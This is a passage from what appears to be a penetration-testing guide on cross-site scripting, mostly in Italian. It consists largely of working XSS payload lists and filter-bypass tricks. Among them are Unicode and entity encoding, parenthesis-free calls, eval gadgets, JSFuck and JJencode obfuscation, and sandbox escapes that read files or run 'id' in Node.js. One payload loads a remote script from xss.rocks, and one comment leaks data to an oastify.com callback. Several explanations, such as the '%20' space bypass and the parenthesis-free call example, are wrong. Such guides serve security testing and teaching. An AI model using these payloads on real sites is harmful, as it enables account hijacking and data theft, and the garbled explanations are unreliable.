Once you have identified the encoding technique used by the application, you can proceed to encode your malicious code accordingly. This can be done manually or by using automated tools that can help you generate the encoded payload.

By executing encoded code, an attacker can perform various actions such as stealing sensitive information, performing unauthorized actions on behalf of the user, or even gaining remote access to the system.

To protect against encoded code execution vulnerabilities, web applications should implement proper input validation and output encoding techniques. Additionally, regular security testing and code reviews can help identify and mitigate such vulnerabilities.
```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```
### Esecuzione di codice JS tramite codifica Unicode

La codifica Unicode è una tecnica comune utilizzata per eseguire codice JavaScript iniettato in un'applicazione web. Questo tipo di attacco sfrutta la capacità di JavaScript di interpretare i caratteri Unicode come codice eseguibile.

#### Come funziona

1. L'attaccante identifica un punto di iniezione di input all'interno dell'applicazione web, come un campo di input o un parametro dell'URL.
2. L'attaccante inserisce del codice JavaScript malevolo all'interno dell'input, utilizzando la codifica Unicode per nascondere il codice.
3. L'applicazione web interpreta l'input come codice JavaScript e lo esegue, senza riconoscere la presenza del codice malevolo.
4. Il codice JavaScript eseguito può sfruttare le funzionalità dell'applicazione web per compiere azioni dannose, come il furto di dati sensibili o l'iniezione di codice dannoso.

#### Esempio di attacco

Supponiamo che l'applicazione web abbia un campo di input per il nome utente e mostri il nome utente inserito in una pagina successiva. L'attaccante potrebbe inserire il seguente codice JavaScript malevolo nell'input:

```javascript
\u003cscript\u003ealert('XSS')\u003c/script\u003e
```

Quando l'applicazione web interpreta l'input, il codice JavaScript viene eseguito e visualizza un popup con il messaggio "XSS".

#### Prevenzione

Per prevenire gli attacchi di codifica Unicode, è necessario implementare una corretta validazione e sanitizzazione dell'input. È importante filtrare e rifiutare qualsiasi input che contenga caratteri non validi o sospetti. Inoltre, è consigliabile utilizzare librerie o framework che offrono funzionalità di sanitizzazione dell'input per proteggere l'applicazione web da attacchi XSS.
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
### Tecniche di bypass delle blacklist JavaScript

**Stringhe**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Escape speciali**

Sometimes, when trying to execute a XSS attack, certain characters may be filtered or escaped by the application. In such cases, it is necessary to use special escape sequences to bypass these filters and successfully inject malicious code.

Here are some commonly used special escape sequences:

- **HTML Entity Encoding**: This involves replacing special characters with their corresponding HTML entities. For example, `<` becomes `&lt;` and `>` becomes `&gt;`. This can help bypass filters that only look for the actual characters.

- **JavaScript Unicode Encoding**: This technique involves encoding characters using their Unicode representation. For example, the character `<` can be encoded as `\u003c`. This can help bypass filters that only look for specific characters or character patterns.

- **CSS Escaping**: This technique involves escaping special characters in CSS syntax. For example, the character `"` can be escaped as `\"`. This can help bypass filters that only look for specific CSS syntax patterns.

- **URL Encoding**: This technique involves encoding special characters using percent encoding. For example, the character `<` can be encoded as `%3C`. This can help bypass filters that only look for specific characters in URLs.

It is important to note that the effectiveness of these escape sequences may vary depending on the context and the specific filtering mechanisms in place. Therefore, it is recommended to try different escape sequences and test their effectiveness in bypassing filters.
```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```
**Sostituzioni di spazi all'interno del codice JS**

In alcuni casi, potresti incontrare restrizioni sulla presenza di spazi all'interno del codice JavaScript quando esegui un attacco XSS. Tuttavia, ci sono alcune tecniche che puoi utilizzare per aggirare questa limitazione.

Una delle tecniche comuni è sostituire gli spazi con caratteri speciali o sequenze di escape. Ad esempio, puoi sostituire uno spazio con `%20`, che è il codice di escape per uno spazio nell'URL. In questo modo, puoi inserire il tuo payload XSS senza utilizzare spazi diretti.

Ecco un esempio di come puoi utilizzare questa tecnica:

```javascript
<script>alert('XSS%20payload');</script>
```

In questo esempio, il payload XSS viene inserito utilizzando `%20` al posto dello spazio. Quando il codice viene eseguito, verrà visualizzato un popup con il messaggio "XSS payload".

Ricorda che questa tecnica può variare a seconda del contesto in cui stai eseguendo l'attacco XSS. Assicurati di adattare la sostituzione degli spazi in base alle restrizioni specifiche del codice JavaScript che stai manipolando.
```javascript
<TAB>
/**/
```
**Commenti JavaScript (dalla** [**trick Commenti JavaScript**](./#javascript-comments) **)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**Nuove righe JavaScript (dal trucco delle** [**nuove righe JavaScript**](./#javascript-new-lines))**

Le nuove righe JavaScript possono essere utilizzate come parte di un attacco di cross-site scripting (XSS) per eludere i filtri di input e inserire codice dannoso in un'applicazione web. Questo trucco sfrutta il fatto che alcuni filtri di input ignorano le nuove righe all'interno di un tag `<script>`, consentendo al codice JavaScript di essere eseguito nonostante la presenza di filtri di sicurezza.

Per utilizzare questo trucco, è possibile inserire il codice JavaScript dannoso all'interno di un tag `<script>` e separare le istruzioni con nuove righe. Ad esempio:

```html
<script>
alert('Codice dannoso');
</script>
```

Quando il codice viene eseguito, verrà visualizzato un popup con il messaggio "Codice dannoso". Questo può essere utilizzato per eseguire azioni dannose come il furto di informazioni sensibili o il dirottamento dell'account dell'utente.

È importante notare che questo trucco potrebbe non funzionare su tutti i filtri di input, poiché alcuni potrebbero essere in grado di rilevare e bloccare le nuove righe all'interno di un tag `<script>`. Pertanto, è sempre consigliabile utilizzare altre tecniche di XSS insieme a questo trucco per massimizzare le possibilità di successo.
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```
**Spazi bianchi in JavaScript**

I caratteri di spaziatura bianca in JavaScript possono essere utilizzati in diverse situazioni per eludere i filtri di sicurezza e ottenere l'esecuzione di codice JavaScript non desiderato. Questi caratteri di spaziatura bianca includono spazi, tabulazioni, ritorni a capo e commenti.

**Spazi bianchi multipli**

In alcuni casi, l'uso di spazi bianchi multipli può essere sfruttato per eludere i filtri di input. Ad esempio, se un'applicazione sanitizza l'input rimuovendo gli spazi bianchi, è possibile bypassare questa protezione utilizzando spazi bianchi multipli consecutivi.

**Spazi bianchi HTML**

I caratteri di spaziatura bianca HTML, come `&nbsp;` e `&#x200b;`, possono essere utilizzati per eludere i filtri di input che rimuovono gli spazi bianchi. Questi caratteri non vengono considerati spazi bianchi normali e possono essere utilizzati per inserire codice JavaScript indesiderato.

**Spazi bianchi Unicode**

I caratteri di spaziatura bianca Unicode, come `U+180E` e `U+2000`, possono essere utilizzati per eludere i filtri di input che rimuovono gli spazi bianchi. Questi caratteri non sono facilmente riconoscibili come spazi bianchi e possono essere utilizzati per nascondere il codice JavaScript dannoso.

**Spazi bianchi invisibili**

I caratteri di spaziatura bianca invisibili, come `U+200B` e `U+FEFF`, possono essere utilizzati per eludere i filtri di input che rimuovono gli spazi bianchi. Questi caratteri sono invisibili all'occhio umano e possono essere utilizzati per nascondere il codice JavaScript dannoso.

**Conclusioni**

I caratteri di spaziatura bianca in JavaScript possono essere sfruttati per eludere i filtri di sicurezza e ottenere l'esecuzione di codice JavaScript non desiderato. È importante che gli sviluppatori e i tester di sicurezza siano consapevoli di queste tecniche e adottino le misure appropriate per mitigare il rischio di attacchi XSS.
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript all'interno di un commento**

Se un'applicazione web permette agli utenti di inserire commenti che vengono visualizzati sul sito, potrebbe essere possibile eseguire codice Javascript all'interno di questi commenti. Questo può essere sfruttato dagli attaccanti per eseguire attacchi di tipo Cross-Site Scripting (XSS).

Per eseguire questa tecnica, l'attaccante inserisce del codice Javascript all'interno di un commento. Quando il commento viene visualizzato sul sito, il codice Javascript viene eseguito nel browser degli utenti che visualizzano il commento compromesso.

Per prevenire questo tipo di attacco, è importante che l'applicazione web effettui una corretta validazione e sanitizzazione dei commenti degli utenti, in modo da evitare l'esecuzione di codice Javascript non desiderato.
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript senza parentesi**

In alcuni casi, è possibile eseguire codice JavaScript senza utilizzare le parentesi. Questo può essere utile quando si cerca di eseguire uno script iniettato in un campo di input o in un parametro di URL.

Ecco alcuni esempi di come è possibile eseguire JavaScript senza parentesi:

1. **Esecuzione diretta**: Se il codice JavaScript non richiede alcun argomento, è possibile eseguirlo direttamente senza parentesi. Ad esempio, se si desidera eseguire la funzione `alert()` senza argomenti, è possibile scriverla come `alert`.

2. **Utilizzo di metodi senza argomenti**: Se si desidera chiamare un metodo senza argomenti, è possibile omettere le parentesi. Ad esempio, invece di scrivere `document.getElementById('myElement').click()`, è possibile scrivere `document.getElementById('myElement').click`.

3. **Chiamata di funzioni con argomenti**: Se si desidera chiamare una funzione con argomenti, è possibile passare gli argomenti senza parentesi. Ad esempio, invece di scrivere `myFunction('arg1', 'arg2')`, è possibile scrivere `myFunction 'arg1', 'arg2'`.

È importante notare che l'omissione delle parentesi può rendere il codice meno leggibile e può causare errori se non viene utilizzata correttamente. Pertanto, è consigliabile utilizzare questa tecnica solo quando necessario e con cautela.
````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````
* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Chiamata arbitraria alla funzione (alert)**
````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````
## **Vulnerabilità DOM**

C'è del **codice JS** che utilizza dei dati **controllati in modo non sicuro da un attaccante**, come `location.href`. Un attaccante potrebbe sfruttare ciò per eseguire del codice JS arbitrario.\
**A causa dell'estensione della spiegazione delle** [**vulnerabilità DOM, è stata spostata in questa pagina**](dom-xss.md)**:**

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

Lì troverai una spiegazione dettagliata su **cosa sono le vulnerabilità DOM, come vengono provocate e come sfruttarle**.\
Inoltre, non dimenticare che **alla fine del post menzionato** puoi trovare una spiegazione sugli [**attacchi di Clobbering DOM**](dom-xss.md#dom-clobbering).

## Altri bypass

### Unicode normalizzato

Puoi verificare se i **valori riflessi** vengono **normalizzati in unicode** nel server (o nel lato client) e sfruttare questa funzionalità per eludere le protezioni. [**Trova un esempio qui**](../unicode-injection/#xss-cross-site-scripting).

### Bypass del flag PHP FILTER\_VALIDATE\_EMAIL
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Bypass di Ruby-On-Rails

A causa della **mass assignment di RoR**, le virgolette vengono inserite nell'HTML e quindi la restrizione delle virgolette viene bypassata e possono essere aggiunti campi aggiuntivi (onfocus) all'interno del tag.\
Ad esempio di modulo ([da questo report](https://hackerone.com/reports/709336)), se invii il payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
La coppia "Key","Value" verrà ripetuta così:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Quindi, verrà inserito l'attributo onfocus e si verificherà XSS.

### Combinazioni speciali
```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS con iniezione di header in una risposta 302

Se scopri che puoi **iniettare header in una risposta di reindirizzamento 302**, potresti provare a **far eseguire al browser del JavaScript arbitrario**. Questo non è **triviale**, poiché i browser moderni non interpretano il corpo della risposta HTTP se il codice di stato della risposta HTTP è 302, quindi un payload di cross-site scripting è inutile.

In [**questo rapporto**](https://www.gremwell.com/firefox-xss-302) e [**questo altro**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) puoi leggere come puoi testare diversi protocolli all'interno dell'header Location e vedere se uno di essi consente al browser di ispezionare ed eseguire il payload XSS all'interno del corpo.\
Protocolli noti: `mailto://`, `//x:1/`, `ws://`, `wss://`, _header Location vuoto_, `resource://`.

### Solo lettere, numeri e punti

Se sei in grado di indicare al **callback** che il javascript sta per **eseguire** limitandolo a quei caratteri. [**Leggi questa sezione di questo post**](./#javascript-function) per scoprire come sfruttare questo comportamento.

### Tipi di contenuto `<script>` validi per XSS

(Da [**qui**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Se provi a caricare uno script con un **content-type** come `application/octet-stream`, Chrome restituirà il seguente errore:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Gli unici **Content-Type** che consentiranno a Chrome di eseguire uno script caricato sono quelli presenti nella costante **`kSupportedJavascriptTypes`** da [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Tipi di script per XSS

(Da [**qui**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Quindi, quali tipi potrebbero essere indicati per caricare uno script?
```html
<script type="???"></script>
```
La risposta è:

* **modulo** (predefinito, niente da spiegare)
* [**webbundle**](https://web.dev/web-bundles/): Web Bundles è una funzionalità che consente di raggruppare insieme una serie di dati (HTML, CSS, JS...) in un file **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
* [**importmap**](https://github.com/WICG/import-maps)**:** Consente di migliorare la sintassi di importazione
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```
Questo comportamento è stato utilizzato in [**questo writeup**](https://github.com/zwade/yaca/tree/master/solution) per mappare una libreria a eval per abusarne e scatenare XSS.

* [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Questa funzionalità serve principalmente per risolvere alcuni problemi causati dal pre-rendering. Funziona in questo modo:
```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```
### Tipi di contenuto web per XSS

(Da [**qui**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) I seguenti tipi di contenuto possono eseguire XSS su tutti i browser:

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? non nella lista ma penso di averlo visto in un CTF)
* application/rss+xml (disattivato)
* application/atom+xml (disattivato)

In altri browser possono essere utilizzati altri **`Content-Types`** per eseguire JS arbitrario, controlla: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### Tipo di contenuto xml

Se la pagina restituisce un tipo di contenuto text/xml, è possibile indicare uno spazio dei nomi ed eseguire JS arbitrario:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Modelli di Sostituzione Speciali

Quando viene utilizzato qualcosa come **`"some {{template}} data".replace("{{template}}", <user_input>)`**, l'attaccante potrebbe utilizzare [**sostituzioni speciali di stringhe**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/String/replace#specifying\_a\_string\_as\_the\_replacement) per cercare di eludere alcune protezioni: ``"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))``

Ad esempio, in [**questo articolo**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), è stato utilizzato per **scappare una stringa JSON** all'interno di uno script ed eseguire codice arbitrario.

### Chrome Cache to XSS

{% content-ref url="chrome-cache-to-xss.md" %}
[chrome-cache-to-xss.md](chrome-cache-to-xss.md)
{% endcontent-ref %}

### Fuga dalle XS Jails

Se hai solo un insieme limitato di caratteri da utilizzare, controlla queste altre soluzioni valide per i problemi di XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Se **tutto è indefinito** prima di eseguire codice non attendibile (come in [**questo articolo**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves)) è possibile generare oggetti utili "dal nulla" per abusare dell'esecuzione di codice arbitrario non attendibile:

* Utilizzando import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```
* Accesso indiretto a `require`

[Secondo questa fonte](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050), i moduli vengono incapsulati da Node.js all'interno di una funzione, come segue:
```javascript
(function (exports, require, module, __filename, __dirname) {
// our actual module code
});
```
Pertanto, se da quel modulo possiamo **chiamare un'altra funzione**, è possibile utilizzare `arguments.callee.caller.arguments[1]` da quella funzione per accedere a **`require`**:

{% code overflow="wrap" %}
```javascript
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
```
{% endcode %}

In modo simile all'esempio precedente, è possibile **utilizzare gli error handlers** per accedere all'**incapsulamento** del modulo e ottenere la funzione **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log('='.repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req('child_process').execSync('id').toString())
}
}
}
trigger()
```
### Oscuramento e Bypass Avanzato

* **Diverse oscurazioni in una pagina:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* JSFuck più sofisticato: [https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
